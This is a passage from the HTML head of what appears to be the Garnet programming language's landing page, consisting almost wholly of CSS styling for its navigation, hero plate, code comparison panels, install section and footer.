jpg">\n<link rel="canonical" href="https://garnet-lang.org/">\n<link rel="alternate" type="application/atom+xml" title="Garnet blog" href="/blog/feed.xml">\n<style>\n  /* ─── Palette + tokens ─────────────────────────────────────── */\n  :root {\n    --bg:           #0A0A0F;          /* OLED black */\n    --bg-soft:      #121218;          /* panel bg */\n    --bg-code:      #18181B;          /* code block bg */\n    --garnet:       #9C2B2E;          /* primary accent */\n    --garnet-2:     #B0303A;          /* hover */\n    --garnet-deep:  #6B1E20;          /* shadow */\n    --gold:         #E5C07B;          /* secondary accent */\n    --rust:         #B7410E;          /* "rust" pillar */\n    --ruby:         #CC0000;          /* "ruby" pillar */\n    --ink:          #E8E8E8;          /* primary text */\n    --ink-soft:     #C8C8D0;          /* tagline */\n    --ink-muted:    #8C98C6;          /* muted: 4.6:1 or better on every page ground */\n    --rule:         #3A3A45;          /* dividers */\n    --code-fg:      #F8F8F2;\n    --code-key:     #FF79C6;\n    --code-str:     #50FA7B;\n    --code-com:     #8C98C6;\n    --code-num:     #BD93F9;\n    --crimson:      #830323;          /* the ruby T — sampled from the hero plate */\n    --crimson-lift: #A61232;          /* the same crimson, lifted for small type and edges */\n    --cream:        #F2E5D4;          /* the wordmark */\n    --accent-text:  #E0535B;          /* garnet for text: 5.2:1 on --bg, 4.7:1 on --bg-code */\n    --rust-text:    #E0782E;          /* rust for text: 6.4:1 on --bg */\n    --ruby-text:    #FF5A5A;          /* ruby for text: 6.4:1 on --bg */\n    --serif:        \'Georgia\', \'Source Serif Pro\', serif;\n    --display:      \'Iowan Old Style\', \'Palatino Linotype\', Palatino, \'Source Serif Pro\', Georgia, serif;\n    --sans:         -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, system-ui, sans-serif;\n    --mono:         \'SF Mono\', \'Menlo\', \'Consolas\', \'JetBrains Mono\', monospace;\n    --maxw:         1180px;\n    --shadow-lift:  0 12px 40px rgba(156, 43, 46, 0.18);\n  }\n\n  /* ─── Reset ────────────────────────────────────────────────── */\n  *,*::before,*::after { box-sizing: border-box; }\n  html,body { margin:0; padding:0; }\n  body {\n    background: var(--bg);\n    color: var(--ink);\n    font-family: var(--sans);\n    line-height: 1.6;\n    -webkit-font-smoothing: antialiased;\n    overflow-x: hidden;\n  }\n  a { color: var(--gold); text-decoration: none; transition: color .2s; }\n  a:hover { color: var(--garnet-2); }\n  img { max-width: 100%; display: block; }\n  ::selection { background: var(--garnet); color: var(--ink); }\n\n  /* ─── Animated starfield (subtle, GPU) ─────────────────────── */\n  .starfield {\n    position: fixed; inset: 0; z-index: -2;\n    background:\n      radial-gradient(ellipse at 30% 20%, rgba(156,43,46,0.08), transparent 60%),\n      radial-gradient(ellipse at 70% 80%, rgba(229,192,123,0.05), transparent 60%),\n      var(--bg);\n    pointer-events: none;\n  }\n  .stars {\n    position: fixed; inset: 0; z-index: -1;\n    background-image:\n      radial-gradient(1px 1px at 20% 30%, rgba(255,255,255,0.4), transparent),\n      radial-gradient(1px 1px at 75% 60%, rgba(255,255,255,0.3), transparent),\n      radial-gradient(1px 1px at 40% 80%, rgba(255,255,255,0.5), transparent),\n      radial-gradient(1px 1px at 90% 20%, rgba(255,255,255,0.3), transparent),\n      radial-gradient(1px 1px at 10% 70%, rgba(255,255,255,0.4), transparent),\n      radial-gradient(1px 1px at 60% 40%, rgba(255,255,255,0.2), transparent);\n    background-size: 100% 100%;\n    pointer-events: none;\n    animation: twinkle 8s ease-in-out infinite alternate;\n  }\n  @keyframes twinkle {\n    from { opacity: 0.6; }\n    to   { opacity: 1; }\n  }\n\n  /* ─── Container ────────────────────────────────────────────── */\n  .container {\n    max-width: var(--maxw);\n    margin: 0 auto;\n    padding: 0 24px;\n  }\n\n  /* ─── Sticky nav ───────────────────────────────────────────── */\n  nav.top {\n    position: sticky; top: 0; z-index: 50;\n    backdrop-filter: blur(14px);\n    background: rgba(10,10,15,0.78);\n    border-bottom: 1px solid var(--rule);\n    padding: 14px 0;\n  }\n  nav.top .container {\n    display: flex; align-items: center; gap: 28px;\n  }\n  nav.top .brand {\n    font-family: var(--serif);\n    font-weight: bold;\n    letter-spacing: 0.18em;\n    color: var(--ink);\n    font-size: 18px;\n  }\n  nav.top .brand .accent { color: var(--crimson-lift); }\n  nav.top .brand:hover { color: var(--gold); }\n  nav.top .brand:focus-visible { outline: 2px solid var(--gold); outline-offset: 3px; border-radius: 4px; }\n  nav.top .links {\n    display: flex; gap: 22px; margin-left: auto;\n    font-size: 14px;\n  }\n  nav.top .links a { color: var(--ink-soft); }\n  nav.top .links a:hover { color: var(--ink); }\n  nav.top .cta {\n    background: var(--garnet);\n    color: var(--ink); padding: 8px 18px;\n    border-radius: 6px; font-size: 14px; font-weight: 600;\n    transition: background .2s, transform .15s;\n  }\n  nav.top .cta:hover {\n    background: var(--garnet-2);\n    transform: translateY(-1px);\n    color: var(--ink);\n  }\n\n  /* ─── Two-step nav: bead, armed state, cue strip, section link ─\n     Why, Install, Playground and Status take two presses: the first goes to\n     the section, the second opens its page. The script below the page adds\n     every class named here; without it none of these rules apply. */\n  html { scroll-padding-top: var(--nav-h, 68px); }          /* jumps and focus land below the sticky bar */\n  nav.top a, .section-offer { touch-action: manipulation; } /* a quick second tap is a click, not a zoom */\n\n  /* The bead\'s 12px of room is reserved only once the script has set the nav\n     up, so with JavaScript off the bar keeps today\'s width and row count. */\n  nav.top.two-step .links a[data-page] { position: relative; padding-right: 12px; }\n  nav.top.two-step .links a[data-page]::after {\n    content: ""; position: absolute; left: 0; right: 12px; bottom: -4px; height: 2px;\n    background: var(--gold); transform: scaleX(0); transform-origin: left;\n    transition: transform .32s cubic-bezier(.16, 1, .3, 1);\n  }\n  nav.top .links a.is-armed { color: var(--gold); }\n  nav.top.two-step .links a.is-armed::after { transform: scaleX(1); }\n\n  .nav-bead {\n    position: absolute; right: 0; top: 50%; width: 10px; height: 10px; margin-top: -5px;\n    pointer-events: none;\n  }\n  .nav-bead::before {\n    content: ""; position: absolute; inset: 2.5px; background: var(--accent-text);\n    transform: rotate(45deg);\n    transition: opacity .2s, transform .32s cubic-bezier(.16, 1, .3, 1);\n  }\n  .nav-bead::after {\n    content: "\\2192"; position: absolute; inset: 0; font: 700 11px/10px var(--sans);\n    color: var(--gold); opacity: 0; transform: translateX(-4px);\n    transition: opacity .2s, transform .32s cubic-bezier(.16, 1, .3, 1);\n  }\n  a.is-armed .nav-bead::before { opacity: 0; transform: rotate(45deg) scale(.4); }\n  a.is-armed .nav-bead::after { opacity: 1; transform: none; }\n\n  .nav-cue {\n    position: absolute; top: calc(100% + 6px); left: var(--cue-left, 16px);\n    display: flex; flex-wrap: wrap; align-items: center; gap: 6px 10px;\n    padding: 8px 14px; background: var(--bg-soft);\n    border: 1px solid var(--rule); border-top-color: var(--gold); border-radius: 8px;\n    box-shadow: var(--shadow-lift);\n    font: 500 13px/1.35 var(--sans); color: var(--ink-soft); white-space: nowrap;\n    opacity: 0; transform: translateY(-4px); pointer-events: none;\n    transition: opacity .2s, transform .2s cubic-bezier(.16, 1, .3, 1);\n  }\n  .nav-cue.is-on { opacity: 1; transform: none; pointer-events: auto; }\n  .nav-cue::before {\n    content: ""; position: absolute; top: -5px; left: calc(var(--caret, 24px) - 4px);\n    width: 8px; height: 8px; background: var(--bg-soft);\n    border-left: 1px solid var(--gold); border-top: 1px solid var(--gold);\n    transform: rotate(45deg);\n  }\n  .nav-cue b { font: italic 600 14px/1 var(--display); color: var(--gold); }\n  .nav-cue .beats { display: inline-flex; gap: 4px; }\n  .nav-cue .beats i { width: 7px; height: 7px; border-radius: 50%; border: 1px solid var(--gold); }\n  .nav-cue .beats i:first-child { background: var(--gold); }\n  .nav-cue.is-on .beats i:last-child { animation: nav-beat .6s ease-in-out .25s 2; }\n  @keyframes nav-beat { 50% { transform: scale(1.45); background: var(--gold); } }\n  .nav-cue-more { color: var(--ink-muted); }\n  .nav-cue-more .nav-bead {\n    position: relative; display: inline-block; top: auto; right: auto;\n    margin: 0 2px; vertical-align: -1px;\n  }\n\n  .section-head {\n    display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;\n    gap: 10px 20px; margin: 0 0 12px;\n  }\n  .section-head > h3 { margin: 0; }\n  .section-offer {\n    position: relative; isolation: isolate;\n    display: inline-flex; align-items: center; gap: 8px; min-height: 32px; padding: 5px 14px;\n    border: 1px solid var(--rule); border-radius: 999px;\n    font: 600 12px/1.2 var(--sans); letter-spacing: .08em; text-transform: uppercase;\n    color: var(--ink-muted); transition: color .2s, border-color .2s;\n  }\n  .section-offer:hover, .section-offer.is-armed { color: var(--gold); border-color: var(--gold); }\n  .section-offer:focus-visible { border-radius: 999px; }  /* the global ring rule would square the pill */\n  .section-offer::before {\n    content: ""; position: absolute; inset: 0; z-index: -1; border-radius: inherit;\n    background: var(--gold); opacity: 0; transition: opacity .2s;\n  }\n  .section-offer.is-armed::before { opacity: .1; }\n  .section-offer::after {\n    content: ""; position: absolute; inset: -1px; border: 1px solid var(--gold);\n    border-radius: inherit; opacity: 0; pointer-events: none;\n  }\n  .section-offer.is-offering { animation: offer-rise .4s cubic-bezier(.16, 1, .3, 1) both; }\n  .section-offer.is-offering::after { animation: offer-ring 1.1s ease-out .3s 2 both; }\n  @keyframes offer-rise { from { opacity: .6; transform: translateY(-4px); } to { opacity: 1; transform: none; } }\n  @keyframes offer-ring { from { opacity: .8; transform: scale(1); } to { opacity: 0; transform: scale(1.18); } }\n\n  .visually-hidden {\n    position: absolute !important; width: 1px; height: 1px; margin: -1px; padding: 0;\n    overflow: hidden; clip-path: inset(50%); white-space: nowrap; border: 0;\n  }\n\n  /* ─── Hero: the plate, and the wordmark laid over it ───────── */\n  .hero {\n    position: relative;\n    min-height: min(78vh, 720px);\n    display: grid; align-items: center;\n    padding: 0;\n    overflow: hidden;\n    border-bottom: 1px solid var(--rule);\n  }\n  .hero-plate {\n    position: absolute; inset: 0;\n    width: 100%; height: 100%;\n    object-fit: cover; object-position: 27% 48%;\n    z-index: 0;\n  }\n  /* Keeps the copy legible over the plate without washing the stone out. */\n  .hero-scrim {\n    position: absolute; inset: 0; z-index: 1; pointer-events: none;\n    background:\n      linear-gradient(90deg, rgba(10,10,15,0) 32%, rgba(10,10,15,.30) 60%, rgba(10,10,15,.50) 100%),\n      linear-gradient(180deg, rgba(10,10,15,.60) 0, rgba(10,10,15,0) 20%),\n      linear-gradient(0deg, rgba(10,10,15,.55) 0, rgba(10,10,15,0) 22%);\n  }\n  .hero > .container { position: relative; z-index: 2; }\n  .hero-grid {\n    display: grid;\n    grid-template-columns: 1fr 1.02fr;\n    align-items: center;\n    gap: 24px;\n  }\n  /* Seats the copy so the plate\'s gold evidence line falls in the gap between\n     the wordmark and the sentence, the way the mockup composes it. */\n  .hero-copy { grid-column: 2; text-align: center; margin-top: 7vh; }\n  .wordmark {\n    font-family: var(--display);\n    font-variant-caps: small-caps;\n    font-weight: 400;\n    font-size: clamp(58px, 8.6vw, 136px);\n    line-height: .94;\n    letter-spacing: .015em;\n    margin: 0;\n    color: var(--cream);\n    text-shadow: 0 6px 44px rgba(0,0,0,.7);\n  }\n  .wordmark .t { color: var(--crimson); }\n  .hero-line {\n    font-family: var(--display);\n    font-style: italic;\n    font-size: clamp(17px, 1.9vw, 27px);\n    line-height: 1.45;\n    color: var(--cream);\n    opacity: .93;\n    margin: 46px auto 38px;\n    max-width: 34rem;\n    text-shadow: 0 2px 22px rgba(0,0,0,.8);\n    text-wrap: balance;\n  }\n  .hero .ctas {\n    display: flex; gap: 14px; justify-content: center; flex-wrap: wrap;\n  }\n  .hero-foot {\n    position: absolute; left: 0; right: 0; bottom: 18px; z-index: 2;\n    font-size: 12px; letter-spacing: .1em; text-transform: uppercase;\n    color: rgba(232,232,232,.5);\n  }\n  .hero-foot .container { display: flex; gap: 8px 20px; flex-wrap: wrap; justify-content: center; }\n  .hero-foot b { color: var(--gold); font-weight: 500; }\n\n  /* A portrait viewport cannot crop a 16:9 plate without losing the stone, so\n     below the two-column width the plate becomes a band and the copy sits under\n     it, fading into the page instead of being scrimmed over. */\n  @media (max-width: 880px) {\n    .hero { min-height: 0; display: block; padding: 0 0 46px; }\n    .hero-plate {\n      position: static;\n      width: 100%; height: auto;\n      aspect-ratio: 6 / 5;\n      object-position: 6% center;\n      -webkit-mask-image: linear-gradient(180deg, #000 72%, transparent 99%);\n      mask-image: linear-gradient(180deg, #000 72%, transparent 99%);\n    }\n    .hero-scrim { display: none; }\n    .hero > .container { margin-top: -9vw; }\n    .hero-grid { grid-template-columns: 1fr; }\n    .hero-copy { grid-column: 1; margin-top: 0; }\n    .wordmark { font-size: clamp(52px, 15vw, 92px); }\n    .hero-line { max-width: 24rem; margin: 22px auto 30px; }\n    .hero-foot { position: static; margin-top: 34px; }\n  }\n\n  /* ─── The first code on the page: check → diff-caps → seal ─── */\n  .proof-sec .term {\n    background: #07070b;\n    border: 1px solid var(--rule);\n    border-radius: 12px;\n    overflow: hidden;\n    box-shadow: 0 30px 80px rgba(0,0,0,.5);\n    margin-top: 26px;\n  }\n  .proof-sec .term-bar {\n    display: flex; align-items: center; gap: 8px;\n    padding: 10px 16px;\n    background: var(--bg-soft);\n    border-bottom: 1px solid var(--rule);\n  }\n  .proof-sec .dotr { width: 10px; height: 10px; border-radius: 50%; background: #3a3a46; }\n  .proof-sec .term-bar span {\n    font: 500 11px var(--mono); color: var(--ink-muted); letter-spacing: .06em; margin-left: 8px;\n  }\n  .proof-sec .term-bar .real {\n    margin-left: auto; font: 500 9.5px var(--mono); letter-spacing: .12em; text-transform: uppercase;\n    color: #5fc79a; border: 1px solid var(--rule); padding: 1px 8px; border-radius: 4px;\n  }\n  .proof-sec .term pre {\n    margin: 0; padding: 20px 22px;\n    font: 400 12.5px/1.75 var(--mono);\n    color: #bfbcc9;\n    overflow-x: auto; white-space: pre;\n  }\n  .proof-sec .term .c  { color: var(--ink-muted); }\n  .proof-sec .term .g  { color: #5fc79a; }\n  .proof-sec .term .au { color: var(--gold); }\n  .proof-sec .term .r  { color: #ff8095; }\n\n  /* ─── The playground, mounted on request ──────────────────── */\n  .pg-mount {\n    margin-top: 26px;\n    border: 1px solid var(--rule);\n    border-radius: 12px;\n    background: var(--bg-soft);\n    padding: 30px 24px;\n    text-align: center;\n  }\n  .pg-mount.loaded { padding: 0; overflow: hidden; background: var(--bg-code); }\n  .pg-mount iframe {\n    display: block; width: 100%; height: 860px; border: 0;\n    background: var(--bg);\n  }\n  .pg-note {\n    margin: 14px auto 0; max-width: 62ch;\n    font-size: 13px; color: var(--ink-muted);\n  }\n  @media (max-width: 720px) {\n    .pg-mount iframe { height: 940px; }\n  }\n\n  .btn {\n    display: inline-flex; align-items: center; gap: 10px;\n    padding: 14px 28px;\n    font-size: 15px;\n    font-weight: 600;\n    border-radius: 8px;\n    transition: all .2s;\n    cursor: pointer;\n    border: 1px solid transparent;\n  }\n  .btn-primary {\n    background: var(--crimson);\n    border-color: var(--crimson-lift);\n    color: #F8F2EA;\n    box-shadow: var(--shadow-lift);\n  }\n  .btn-primary:hover {\n    background: var(--crimson-lift);\n    transform: translateY(-2px);\n    box-shadow: var(--shadow-lift);\n    color: var(--ink) !important;\n  }\n  .btn-ghost {\n    background: transparent;\n    color: var(--ink-soft) !important;\n    border-color: var(--rule);\n  }\n  .btn-ghost:hover {\n    border-color: var(--gold);\n    color: var(--gold) !important;\n    transform: translateY(-2px);\n  }\n\n  /* ─── Section base ─────────────────────────────────────────── */\n  section { padding: 88px 0; }\n  section.dense { padding: 56px 0; }\n  h2 {\n    font-family: var(--serif);\n    font-size: clamp(32px, 5vw, 48px);\n    margin: 0 0 16px;\n    color: var(--ink);\n    letter-spacing: 0.02em;\n  }\n  h2 .accent { color: var(--accent-text); }\n  h3 {\n    font-family: var(--sans);\n    font-size: 18px;\n    font-weight: 600;\n    color: var(--gold);\n    letter-spacing: 0.12em;\n    text-transform: uppercase;\n    margin: 0 0 12px;\n  }\n  p.lead {\n    font-size: clamp(17px, 2vw, 20px);\n    color: var(--ink-soft);\n    max-width: 760px;\n    margin: 0 0 40px;\n  }\n\n  /* ─── Reveal-on-scroll ─────────────────────────────────────── */\n  .reveal {\n    opacity: 0; transform: translateY(20px);\n    transition: opacity .8s ease, transform .8s ease;\n  }\n  .reveal.in {\n    opacity: 1; transform: translateY(0);\n  }\n  section:target .reveal {\n    opacity: 1; transform: translateY(0);\n  }\n\n  /* ─── Three pillars ────────────────────────────────────────── */\n  .pillars {\n    display: grid;\n    grid-template-columns: 1fr 1fr 1fr;\n    gap: 22px;\n    margin-top: 40px;\n  }\n  .pillar {\n    background: var(--bg-soft);\n    border: 1.5px solid var(--rule);\n    padding: 32px 28px;\n    border-radius: 12px;\n    transition: transform .3s, border-color .3s, box-shadow .3s;\n    position: relative;\n  }\n  .pillar:hover {\n    transform: translateY(-6px);\n    box-shadow: var(--shadow-lift);\n  }\n  .pillar.rust   { border-color: var(--rust); }\n  .pillar.ruby   { border-color: var(--ruby); }\n  .pillar.garnet {\n    border-color: var(--garnet);\n    background: linear-gradient(180deg, rgba(156,43,46,0.06) 0%, var(--bg-soft) 100%);\n  }\n  .pillar h3 { letter-spacing: 0.18em; font-size: 14px; }\n  .pillar.rust h3   { color: var(--rust-text); }\n  .pillar.ruby h3   { color: var(--ruby-text); }\n  .pillar.garnet h3 { color: var(--accent-text); }\n  .pillar .name {\n    font-family: var(--serif);\n    font-size: 36px;\n    font-weight: bold;\n    margin: 4px 0 16px;\n    letter-spacing: 0.04em;\n  }\n  .pillar.rust .name   { color: var(--rust-text); }\n  .pillar.ruby .name   { color: var(--ruby-text); }\n  .pillar.garnet .name { color: var(--accent-text); }\n  .pillar p { color: var(--ink); margin: 0 0 14px; font-size: 15px; }\n  .pillar .caveat { color: var(--ink-muted); font-size: 14px; font-style: italic; }\n\n  /* ─── Quote-style thesis section ───────────────────────────── */\n  .thesis {\n    background: linear-gradient(135deg, rgba(156,43,46,0.04) 0%, transparent 100%);\n    border-top: 1px solid var(--rule);\n    border-bottom: 1px solid var(--rule);\n    text-align: center;\n  }\n  .thesis blockquote {\n    font-family: var(--serif);\n    font-size: clamp(24px, 3.5vw, 36px);\n    line-height: 1.4;\n    color: var(--ink);\n    max-width: 920px;\n    margin: 0 auto;\n    padding: 0 20px;\n  }\n  .thesis blockquote .accent {\n    color: var(--accent-text);\n    font-style: italic;\n  }\n  .thesis cite {\n    display: block;\n    margin-top: 32px;\n    font-style: normal;\n    color: var(--ink-muted);\n    font-size: 14px;\n    letter-spacing: 0.1em;\n    text-transform: uppercase;\n  }\n\n  /* ─── Code comparison tabs ─────────────────────────────────── */\n  .tabs {\n    display: flex; gap: 4px;\n    border-bottom: 1px solid var(--rule);\n    margin: 32px 0 0;\n    overflow-x: auto;\n  }\n  .tab {\n    padding: 12px 20px;\n    background: transparent;\n    color: var(--ink-soft);\n    border: none;\n    cursor: pointer;\n    font-size: 14px;\n    font-family: var(--sans);\n    border-bottom: 2px solid transparent;\n    transition: all .2s;\n    white-space: nowrap;\n  }\n  .tab:hover { color: var(--ink); }\n  .tab.active {\n    color: var(--accent-text);\n    border-bottom-color: var(--garnet);\n    font-weight: 600;\n  }\n  .tab-panes { margin-top: 20px; }\n  .tab-pane { display: none; }\n  .tab-pane.active { display: block; animation: fadeIn .3s ease; }\n  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }\n\n  .code-grid {\n    display: grid;\n    grid-template-columns: 1fr 1fr 1fr;\n    gap: 16px;\n  }\n  .code-col {\n    background: var(--bg-code);\n    border: 1px solid var(--rule);\n    border-radius: 8px;\n    overflow: hidden;\n  }\n  .code-col .head {\n    display: flex; align-items: center; gap: 10px;\n    padding: 10px 16px;\n    border-bottom: 1px solid var(--rule);\n    font-size: 13px;\n    font-weight: 600;\n    letter-spacing: 0.08em;\n  }\n  .code-col .swatch {\n    width: 4px; height: 18px; border-radius: 2px;\n  }\n  .code-col.rust .swatch   { background: var(--rust);   } .code-col.rust .head   { color: var(--rust-text);   }\n  .code-col.ruby .swatch   { background: var(--ruby);   } .code-col.ruby .head   { color: var(--ruby-text);   }\n  .code-col.garnet .swatch { background: var(--garnet); } .code-col.garnet .head { color: var(--accent-text); }\n  .code-col pre {\n    margin: 0;\n    padding: 18px 20px;\n    font-family: var(--mono);\n    font-size: 13px;\n    line-height: 1.6;\n    color: var(--code-fg);\n    white-space: pre;\n    overflow-x: auto;\n  }\n  .code-col pre .k { color: var(--code-key); }\n  .code-col pre .s { color: var(--code-str); }\n  .code-col pre .c { color: var(--code-com); font-style: italic; }\n  .code-col pre .n { color: var(--code-num); }\n  .code-col pre .a { color: var(--gold); }\n\n  /* ─── 6-feature grid ───────────────────────────────────────── */\n  .features {\n    display: grid;\n    grid-template-columns: repeat(3, 1fr);\n    gap: 20px;\n    margin-top: 40px;\n  }\n  .feature {\n    background: var(--bg-soft);\n    border: 1px solid var(--rule);\n    padding: 28px 24px;\n    border-radius: 10px;\n    transition: all .3s;\n    position: relative;\n    overflow: hidden;\n  }\n  .feature::before {\n    content: \'\';\n    position: absolute; top: 0; left: 0; right: 0; height: 3px;\n    background: linear-gradient(90deg, var(--garnet), transparent);\n    opacity: 0;\n    transition: opacity .3s;\n  }\n  .feature:hover {\n    border-color: var(--garnet);\n    transform: translateY(-4px);\n    box-shadow: var(--shadow-lift);\n  }\n  .feature:hover::before { opacity: 1; }\n  .feature .icon {\n    font-family: var(--mono);\n    color: var(--gold);\n    font-size: 20px;\n    margin-bottom: 10px;\n  }\n  .feature h4 {\n    font-family: var(--serif);\n    font-size: 20px;\n    color: var(--ink);\n    margin: 0 0 12px;\n  }\n  .feature p {\n    color: var(--ink-soft);\n    font-size: 14px;\n    margin: 0;\n  }\n\n  /* ─── @caps section ─────────────────────────────────────────── */\n  .caps-showcase {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 40px;\n    align-items: center;\n    margin-top: 40px;\n  }\n  .caps-showcase .code-col pre { font-size: 14px; padding: 24px; }\n  .caps-list { font-size: 15px; color: var(--ink); }\n  .caps-list .row {\n    display: flex; gap: 16px;\n    padding: 12px 0;\n    border-bottom: 1px solid var(--rule);\n  }\n  .caps-list .row:last-child { border-bottom: none; }\n  .caps-list .tag {\n    font-family: var(--mono);\n    background: var(--bg-code);\n    color: var(--gold);\n    padding: 2px 10px;\n    border-radius: 4px;\n    font-size: 13px;\n    flex-shrink: 0;\n    height: fit-content;\n  }\n  .caps-list .desc { color: var(--ink-soft); font-size: 14px; }\n\n  /* ─── Convert section ──────────────────────────────────────── */\n  .convert-grid {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 16px;\n    margin-top: 40px;\n  }\n  .lang-badges {\n    display: flex; gap: 10px; flex-wrap: wrap;\n    margin-top: 24px;\n  }\n  .lang-badge {\n    display: inline-flex; align-items: center; gap: 8px;\n    background: var(--bg-soft);\n    border: 1px solid var(--rule);\n    padding: 8px 16px;\n    border-radius: 20px;\n    font-size: 13px;\n    color: var(--ink-soft);\n    font-family: var(--mono);\n  }\n  .lang-badge::before {\n    content: \'\';\n    width: 8px; height: 8px; border-radius: 50%;\n    background: var(--gold);\n  }\n\n  /* ─── Install section ──────────────────────────────────────── */\n  .install-tabs { margin-top: 24px; }\n  .install-pane {\n    background: var(--bg-code);\n    border: 1px solid var(--rule);\n    border-radius: 8px;\n    padding: 0;\n    margin-top: 16px;\n    display: none;\n    overflow: hidden;\n  }\n  .install-pane.active { display: block; animation: fadeIn .3s ease; }\n  .install-pane pre {\n    margin: 0;\n    padding: 24px 28px;\n    font-family: var(--mono);\n    font-size: 14px;\n    color: var(--code-fg);\n    white-space: pre;\n    overflow-x: auto;\n    line-height: 1.7;\n  }\n  .install-pane .copy {\n    position: absolute; top: 16px; right: 16px;\n    background: var(--bg-soft);\n    color: var(--ink-soft);\n    border: 1px solid var(--rule);\n    padding: 6px 14px;\n    border-radius: 6px;\n    cursor: pointer;\n    font-size: 12px;\n    font-family: var(--sans);\n    transition: all .2s;\n  }\n  .install-pane .copy:hover { color: var(--gold); border-color: var(--gold); }\n  .install-pane .copy.done { color: var(--code-str); border-color: var(--code-str); }\n  .install-wrap { position: relative; }\n\n  /* ─── Promo video ─────────────────────────────────────────── */\n  .promo-frame {\n    margin-top: 32px;\n    border: 1px solid var(--rule);\n    border-radius: 8px;\n    overflow: hidden;\n    background: var(--bg-code);\n  }\n  .promo-video {\n    display: block;\n    width: 100%;\n    height: auto;\n    aspect-ratio: 16 / 9;\n    background: #000;\n  }\n  .evidence-note {\n    color: var(--ink-muted);\n    font-size: 14px;\n    margin-top: 18px;\n    max-width: 860px;\n  }\n\n  /* ─── Numbers grid ─────────────────────────────────────────── */\n  .numbers {\n    display: grid;\n    grid-template-columns: repeat(6, 1fr);\n    gap: 4px;\n    margin-top: 40px;\n    background: var(--rule);\n    border: 1px solid var(--rule);\n    border-radius: 12px;\n    overflow: hidden;\n  }\n  .number {\n    background: var(--bg);\n    padding: 28px 16px;\n    text-align: center;\n  }\n  .number .big {\n    font-family: var(--serif);\n    font-size: clamp(28px, 4vw, 42px);\n    color: var(--garnet);\n    font-weight: bold;\n    line-height: 1;\n  }\n  .number .small {\n    color: var(--ink-soft);\n    font-size: 12px;\n    margin-top: 8px;\n    letter-spacing: 0.08em;\n    text-transform: uppercase;\n  }\n  .objective-pulse {\n    margin-top: 30px;\n    display: grid;\n    grid-template-columns: minmax(220px, 0.8fr) minmax(0, 1.2fr);\n    gap: 20px;\n    align-items: stretch;\n  }\n  .objective-meter,\n  .objective-list {\n    background: var(--bg-soft);\n    border: 1px solid var(--rule);\n    border-radius: 8px;\n    padding: 24px;\n  }\n  .objective-meter .label,\n  .objective-list .label {\n    color: var(--gold);\n    font-size: 12px;\n    font-weight: 700;\n    letter-spacing: 0.12em;\n    text-transform: uppercase;\n  }\n  .objective-meter .percent {\n    font-family: var(--serif);\n    font-size: clamp(44px, 7vw, 72px);\n    font-weight: 700;\n    line-height: 1;\n    margin: 14px 0 10px;\n    color: var(--ink);\n  }\n  .objective-meter .meter {\n    width: 100%;\n    height: 10px;\n    border-radius: 999px;\n    background: var(--bg-code);\n    border: 1px solid var(--rule);\n    overflow: hidden;\n  }\n  .objective-meter .fill {\n    width: 0; /* set from the stamped readiness percent by the inline script (RB-0d) */\n    height: 100%;\n    background: var(--garnet);\n  }\n  .objective-list ul {\n    list-style: none;\n    margin: 14px 0 0;\n    padding: 0;\n    display: grid;\n    gap: 10px;\n  }\n  .objective-list li {\n    color: var(--ink-soft);\n    font-size: 14px;\n    line-height: 1.5;\n  }\n  .objective-list code {\n    color: var(--gold);\n  }\n\n  /* ─── Docs cards ───────────────────────────────────────────── */\n  .doc-cards {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 16px;\n    margin-top: 40px;\n  }\n  .doc-card {\n    background: var(--bg-soft);\n    border: 1px solid var(--rule);\n    padding: 24px 28px;\n    border-radius: 10px;\n    transition: all .3s;\n    color: var(--ink);\n    display: block;\n  }\n  .doc-card:hover {\n    border-color: var(--gold);\n    transform: translateY(-3px);\n    box-shadow: var(--shadow-lift);\n    color: var(--ink);\n  }\n  .doc-card .label {\n    color: var(--gold);\n    font-size: 12px;\n    letter-spacing: 0.14em;\n    text-transform: uppercase;\n    margin-bottom: 8px;\n  }\n  .doc-card h4 {\n    font-family: var(--serif);\n    font-size: 22px;\n    margin: 0 0 8px;\n    color: var(--ink);\n  }\n  .doc-card p {\n    color: var(--ink-soft);\n    font-size: 14px;\n    margin: 0;\n  }\n\n  /* ─── Footer ───────────────────────────────────────────────── */\n  footer {\n    border-top: 1px solid var(--rule);\n    padding: 48px 0 36px;\n    text-align: center;\n    color: var(--ink-muted);\n    font-size: 13px;\n    margin-top: 60px;\n  }\n  footer .verse {\n    font-family: var(--serif);\n    font-style: italic;\n    color: var(--ink-soft);\n    font-size: 15px;\n    margin-bottom: 16px;\n  }\n  footer .links {\n    display: flex; gap: 12px 24px; justify-content: center;\n    flex-wrap: wrap;\n    margin-bottom: 14px;\n  }\n  footer .copyright { color: var(--ink-muted); }\n\n  footer .builtby-row { display: flex; justify-content: center; margin-bottom: 18px; }\n  footer .builtby {\n    display: inline-flex; align-items: center; gap: 10px;\n    font: 600 11.5px var(--mono); letter-spacing: .14em; text-transform: uppercase;\n    color: var(--ink-soft);\n  }\n  footer .builtby img { border-radius: 6px; }\n  footer .builtby b { color: var(--ink); font-weight: 600; }\n\n  /* A pre never widens the page; long lines scroll inside it. */\n  pre { max-width: 100%; overflow-x: auto; }\n\n  .transcript { margin-top: 18px; border: 1px solid var(--rule); border-radius: 10px; background: var(--bg-soft); padding: 4px 18px; }\n  .transcript summary { cursor: pointer; padding: 10px 0; color: var(--ink); font-weight: 600; }\n  .transcript ol { margin: 4px 0 14px; padding-left: 22px; color: var(--ink-soft); font-size: 14.5px; line-height: 1.65; }\n  .transcript li { margin-bottom: 8px; }\n  .transcript code { overflow-wrap: anywhere; }\n\n  /* Keyboard focus is drawn, not left to the user agent. */\n  a:focus-visible, button:focus-visible, .btn:focus-visible, .tab:focus-visible, pre:focus-visible, summary:focus-visible, [role="tabpanel"]:focus-visible {\n    outline: 2px solid var(--gold); outline-offset: 3px; border-radius: 4px;\n  }\n  /* A focusable example sits in an overflow-hidden .code-col, so its ring is drawn\n     inside the <pre> where the column cannot clip it. */\n  pre:focus-visible { outline-offset: -2px; }\n\n  /* ─── Responsive ───────────────────────────────────────────── */\n  @media (max-width: 900px) {\n    nav.top .container { flex-wrap: wrap; gap: 12px 18px; }\n    nav.top .links {\n      order: 3; width: 100%; margin-left: 0;\n      gap: 10px 16px; flex-wrap: wrap; justify-content: center;\n      